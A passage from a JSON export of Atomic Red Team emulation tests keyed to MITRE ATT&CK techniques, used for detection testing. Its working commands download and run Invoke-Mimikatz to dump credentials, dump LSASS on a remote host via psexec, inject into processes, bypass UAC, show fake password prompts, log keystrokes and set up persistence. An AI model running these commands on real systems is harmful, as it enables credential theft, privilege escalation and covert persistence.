(Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Mimikatz", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mimurl | Mimikatz url | Url | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 | "}, "executionSteps": [{"description": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Invoke-AppPathBypass", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | encoded_command_param_variation | The \"EncodedCommand\" parameter variation to use | String | E | \n | command_line_switch_type | The type of supported command-line switch to use | String | Hyphen | \n | encoded_arguments_param_variation | The \"EncodedArguments\" parameter variation to use | String | EncodedArguments | "}, "executionSteps": [{"description": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes powershell.exe with variations of the -EncodedCommand parameter\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_line_switch_type | The type of supported command-line switch to use | String | Hyphen | \n | encoded_command_param_variation | The \"EncodedCommand\" parameter variation to use | String | E | "}, "executionSteps": [{"description": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_line_switch_type | The type of supported command-line switch to use | String | Hyphen | \n | command_param_variation | The \"Command\" parameter variation to use | String | C | \n | encoded_arguments_param_variation | The \"EncodedArguments\" parameter variation to use | String | EA | "}, "executionSteps": [{"description": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "ATHPowerShellCommandLineParameter -Command parameter variations", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes powershell.exe with variations of the -Command parameter\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_line_switch_type | The type of supported command-line switch to use | String | Hyphen | \n | command_param_variation | The \"Command\" parameter variation to use | String | C | "}, "executionSteps": [{"description": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Process Discovery - wmic process", "shortName": "T1057", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic process get /format:list\n", "successCriteria": null}], "techniqueIds": ["clacwm6ed03dm29mq9e4bg33y"], "tags": []}, {"data": {"name": "Process Discovery - tasklist", "shortName": "T1057", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "tasklist\n", "successCriteria": null}], "techniqueIds": ["clacwm6ed03dm29mq9e4bg33y", "clacwm29t00p529mqb6ge0cq0"], "tags": []}, {"data": {"name": "Process Discovery - ps", "shortName": "T1057", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | path of output file | path | /tmp/loot.txt | "}, "executionSteps": [{"description": "ps >> #{output_file}\nps aux >> #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ed03dm29mq9e4bg33y", "clacwm29t00p529mqb6ge0cq0"], "tags": []}, {"data": {"name": "Process Discovery - get-wmiObject", "shortName": "T1057", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-wmiObject -class Win32_Process\n", "successCriteria": null}], "techniqueIds": ["clacwm6ed03dm29mq9e4bg33y"], "tags": []}, {"data": {"name": "Process Discovery - Get-Process", "shortName": "T1057", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-Process\n", "successCriteria": null}], "techniqueIds": ["clacwm6ed03dm29mq9e4bg33y"], "tags": []}, {"data": {"name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "shortName": "T1056.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Hooks functions in PowerShell to read TLS Communications\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | Dll To Inject | Path | PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll | \n | server_name | TLS Server To Test Get Request | Url | https://www.example.com | "}, "executionSteps": [{"description": "mavinject $pid /INJECTRUNNING #{file_name}\nInvoke-WebRequest #{server_name} -UseBasicParsing\n", "successCriteria": null}], "techniqueIds": ["clacwm6u003v429mqbznr96lw", "clacwm1jy007929mq2t9p1ogs"], "tags": []}, {"data": {"name": "PowerShell - Prompt User for Password", "shortName": "T1056.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n", "successCriteria": null}], "techniqueIds": ["clacwm6gr03gh29mq43bs60r9", "clacwm1w900f329mqaiu3cvn8"], "tags": []}, {"data": {"name": "AppleScript - Prompt User for Password", "shortName": "T1056.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "successCriteria": null}], "techniqueIds": ["clacwm6gr03gh29mq43bs60r9", "clacwm1w900f329mqaiu3cvn8"], "tags": []}, {"data": {"name": "SSHD PAM keylogger", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_account | Basic ssh user account for testing. | String | ubuntu | "}, "executionSteps": [{"description": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg"], "tags": []}, {"data": {"name": "MacOS Swift Keylogger", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | swift_src | Location of swift script | Path | PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift | "}, "executionSteps": [{"description": "swift #{swift_src} -keylog\n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg"], "tags": []}, {"data": {"name": "Logging bash history to syslog", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg"], "tags": []}, {"data": {"name": "Living off the land Terminal Input Capture on Linux with pam.d", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/system-auth", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg", "clacwm20f00hw29mq131kafwg"], "tags": []}, {"data": {"name": "Input Capture", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filepath | Name of the local file, include path. | Path | $env:TEMP\\key.log | "}, "executionSteps": [{"description": "Set-Location $PathToAtomicsFolder\n.\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg", "clacwm20f00hw29mq131kafwg"], "tags": []}, {"data": {"name": "Bash session based keylogger", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | File to store captured commands | String | /tmp/.keyboard.log | "}, "executionSteps": [{"description": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg"], "tags": []}, {"data": {"name": "Auditd keylogger", "shortName": "T1056.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\") \n", "successCriteria": null}], "techniqueIds": ["clacwm5py02og29mqcrqa6xdg"], "tags": []}, {"data": {"name": "RunPE via VBA", "shortName": "T1055.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module executes notepad.exe from within the WINWORD.EXE process\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ms_product | Maldoc application Word | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ia03ij29mq4dl9gwtw", "clacwm2a400pa29mq9d6kckj4"], "tags": []}, {"data": {"name": "Process Hollowing using PowerShell", "shortName": "T1055.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | hollow_binary_path | Path of the binary to hollow (executable that will run inside the sponsor) | String | C:\\Windows\\System32\\cmd.exe | \n | parent_process_name | Name of the parent process | String | explorer | \n | sponsor_binary_path | Path of the sponsor binary (executable that will host the binary) | String | C:\\Windows\\System32\\notepad.exe | \n | spawnto_process_name | Name of the process to spawn | String | notepad | "}, "executionSteps": [{"description": ". $PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6ia03ij29mq4dl9gwtw", "clacwm2a400pa29mq9d6kckj4"], "tags": []}, {"data": {"name": "Process Injection via C#", "shortName": "T1055.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_binary | Output Binary | Path | PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe | "}, "executionSteps": [{"description": "#{exe_binary}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ba03a829mqhfbggqit", "clacwm1d3002p29mq61lxcdjy"], "tags": []}, {"data": {"name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique", "shortName": "T1055.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')", "successCriteria": null}], "techniqueIds": ["clacwm6to03ut29mq7i5j042q"], "tags": []}, {"data": {"name": "Process Injection via mavinject.exe", "shortName": "T1055.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_id | PID of input_arguments | Integer | (Start-Process notepad -PassThru).id | \n | dll_payload | DLL to Inject | Path | PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll | "}, "executionSteps": [{"description": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING #{dll_payload}\nStop-Process -processname notepad\n", "successCriteria": null}], "techniqueIds": ["clacwm6to03ut29mq7i5j042q", "clacwm1rh00bx29mqgbke1jei"], "tags": []}, {"data": {"name": "Shellcode execution via VBA", "shortName": "T1055", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61l030c29mq7lua0voz", "clacwm2a700pd29mq628zed5d"], "tags": []}, {"data": {"name": "Remote Process Injection in LSASS via mimikatz", "shortName": "T1055", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | machine | machine to target (via psexec) | String | DC1 | \n | mimikatz_path | Mimikatz windows executable | Path | %tmp%\\mimikatz\\x64\\mimikatz.exe | \n | psexec_path | Path to PsExec | String | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "#{psexec_path} /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61l030c29mq7lua0voz", "clacwm2a700pd29mq628zed5d"], "tags": []}, {"data": {"name": "ListCronjobs", "shortName": "T1053.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n\n\n**Supported Platforms:** containers\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | namespace | K8s namespace to list | String | default | "}, "executionSteps": [{"description": "kubectl get cronjobs -n #{namespace}\n", "successCriteria": null}], "techniqueIds": ["clacwm5rr02qh29mqepvk0hm6"], "tags": []}, {"data": {"name": "CreateCronjob", "shortName": "T1053.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n\n\n**Supported Platforms:** containers\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | namespace | K8s namespace to list | String | default | "}, "executionSteps": [{"description": "kubectl create -f src/cronjob.yaml -n #{namespace}\n", "successCriteria": null}], "techniqueIds": ["clacwm5rr02qh29mqepvk0hm6"], "tags": []}, {"data": {"name": "Create Systemd Service and Timer", "shortName": "T1053.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_systemd_service | Path to systemd service unit file | Path | /etc/systemd/system/art-timer.service | \n | path_to_systemd_timer | Path to service timer file | Path | /etc/systemd/system/art-timer.timer | \n | systemd_service_name | Name of systemd service | String | art-timer.service | \n | systemd_timer_name | Name of systemd service timer | String | art-timer.timer | "}, "executionSteps": [{"description": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n", "successCriteria": null}], "techniqueIds": ["clacwm6h203gw29mqbpdp0bw5", "clacwm2iq00wp29mq872k3zyo"], "tags": []}, {"data": {"name": "Create a user level transient systemd service and timer", "shortName": "T1053.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "successCriteria": null}], "techniqueIds": ["clacwm6h203gw29mqbpdp0bw5"], "tags": []}, {"data": {"name": "Create a system level transient systemd service and timer", "shortName": "T1053.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "successCriteria": null}], "techniqueIds": ["clacwm6h203gw29mqbpdp0bw5"], "tags": []}, {"data": {"name": "WMI Invoke-CimMethod Scheduled Task", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xml_path | path of vbs to use when creating masquerading files | Path | PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml | "}, "executionSteps": [{"description": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Task Scheduler via VBA", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | 